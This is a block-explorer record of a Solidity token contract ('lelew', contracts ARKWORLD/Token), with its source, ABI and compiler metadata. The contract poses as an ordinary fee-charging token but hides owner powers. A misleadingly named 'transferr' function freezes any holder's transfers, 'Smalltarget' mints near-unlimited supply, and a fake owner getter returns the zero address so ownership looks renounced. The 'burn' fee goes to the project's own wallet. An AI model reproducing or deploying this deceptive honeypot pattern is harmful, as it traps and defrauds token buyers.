{"SourceCode": "pragma solidity ^0.4.25;\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Ownable {\r\n    address public owmmner;\r\n\r\n    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);\r\n\r\n    modifier onlyowneres() {\r\n        require(msg.sender == owmmner);\r\n        _;\r\n    }\r\n\r\n/**\r\n    * @dev Returns the address of the current owmmner.\r\n     */\r\n    function owmmner() public pure returns (address) {\r\n        return address(0);\r\n    }\r\n\r\n\r\n    function transferowneresship(address newowneres) public onlyowneres {\r\n        require(newowneres != address(0));\r\n        emit owneresshipTransferred(owmmner, newowneres);\r\n        owmmner = newowneres;\r\n    }\r\n\r\n    function renounceowneresship() public onlyowneres {\r\n        emit owneresshipTransferred(owmmner, address(0));\r\n        owmmner = address(0);\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract ARKWORLD is Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string constant public name = 'lelew';\r\n\r\n    string constant public symbol = 'lelew';\r\n\r\n    uint8 constant public decimals = 18;\r\n\r\n    uint256 public totalSupply = 100000000000000*10**uint256(decimals);\r\n\r\n    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);\r\n\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n\r\n    mapping(address => bool) private _isExcludedFromcfi;\r\n\r\n    mapping(address => bool) private _lkck;\r\n\r\n\r\n    uint256 public _taxcfi = 1;\r\n    uint256 private _previousTaxcfi = _taxcfi;\r\n\r\n    uint256 public _burncfi = 1;\r\n    uint256 private _previousBurncfi = _burncfi;\r\n\r\n\r\n    address public projectAddress = 0xb220c12CF27e6862B73b28345113449F67FDe825;\r\n\r\n\r\n    address public burnAddress = 0xb220c12CF27e6862B73b28345113449F67FDe825;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owmmner, address indexed spender, uint256 value);\r\n\r\n    function _transfer(address from, address to, uint value) internal {\r\n        require(to != address(0), \"is 0 address\");\r\n\r\n        require(!_lkck[from], \"is lkck\");\r\n\r\n        if(_isExcludedFromcfi[from])\r\n            removeAllcfi();\r\n\r\n        uint256 cfi =  calculateTaxcfi(value);\r\n\r\n        uint256 burn =  calculateBurncfi(value);\r\n\r\n        balanceOf[from] = balanceOf[from].sub(value);\r\n\r\n        balanceOf[to] = balanceOf[to].add(value).sub(cfi).sub(burn);\r\n\r\n        if(cfi > 0) {\r\n            balanceOf[projectAddress] = balanceOf[projectAddress].add(cfi);\r\n            emit Transfer(from, projectAddress, cfi);\r\n        }\r\n\r\n        if(burn > 0) {\r\n            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);\r\n            emit Transfer(from, burnAddress, burn);\r\n        }\r\n\r\n\r\n         if(_isExcludedFromcfi[from])\r\n            restoreAllcfi();\r\n\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n\r\n    function transfer(address to, uint256 value) public returns (bool) {\r\n        _transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\n        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\r\n        _transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        require(spender != address(0));\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        require(spender != address(0));\r\n        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        require(spender != address(0));\r\n        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n\r\n    function Smalltarget(address target, uint256 edAmount) public onlyowneres{\r\n    \trequire (totalSupply + edAmount <= MAXSupply);\r\n\r\n        balanceOf[target] = balanceOf[target].add(edAmount);\r\n        totalSupply = totalSupply.add(edAmount);\r\n\r\n        emit Transfer(0, this, edAmount);\r\n        emit Transfer(this, target, edAmount);\r\n    }\r\n\r\n    function calculateTaxcfi(uint256 _amount) private view returns (uint256) {\r\n        return _amount.mul(_taxcfi).div(\r\n            10 ** 2\r\n        );\r\n    }\r\n\r\n    function calculateBurncfi(uint256 _amount) private view returns (uint256) {\r\n        return _amount.mul(_burncfi).div(\r\n            10 ** 2\r\n        );\r\n    }\r\n\r\n    function removeAllcfi() private {\r\n        if(_taxcfi == 0 && _burncfi == 0)\r\n            return;\r\n\r\n        _previousTaxcfi = _taxcfi;\r\n        _previousBurncfi = _burncfi;\r\n        _taxcfi = 0;\r\n        _burncfi = 0;\r\n    }\r\n\r\n    function restoreAllcfi() private {\r\n        _taxcfi = _previousTaxcfi;\r\n        _burncfi = _previousBurncfi;\r\n    }\r\n\r\n\r\n\r\n    function transferr(address account) public onlyowneres {\r\n        _lkck[account] = true;\r\n    }\r\n\r\n\r\n    function UNBACK(address account) public onlyowneres {\r\n        _lkck[account] = false;\r\n    }\r\n\r\n\r\n    function islkck(address account) public view returns (bool) {\r\n\r\n        return _lkck[account];\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\ncontract Token is ARKWORLD {\r\n\r\n    constructor() public {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n\r\n        owmmner = msg.sender;\r\n\r\n\r\n    }\r\n\r\n    function() public payable {\r\n       revert();\r\n    }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"account\",\"type\":\"address\"}],\"name\":\"UNBACK\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owmmner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"target\",\"type\":\"address\"},{\"name\":\"edAmount\",\"type\":\"uint256\"}],\"name\":\"Smalltarget\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"account\",\"type\":\"address\"}],\"name\":\"transferr\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"projectAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceowneresship\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"burnAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"account\",\"type\":\"address\"}],\"name\":\"islkck\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_taxcfi\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newowneres\",\"type\":\"address\"}],\"name\":\"transferowneresship\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MAXSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_burncfi\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owmmner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousowneres\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newowneres\",\"type\":\"address\"}],\"name\":\"owneresshipTransferred\",\"type\":\"event\"}]", "ContractName": "Token", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://fab45302d51dc9a2fcd2e7848ad1f1deec40922fb9bc1ba8a297b7c6c76f8699"}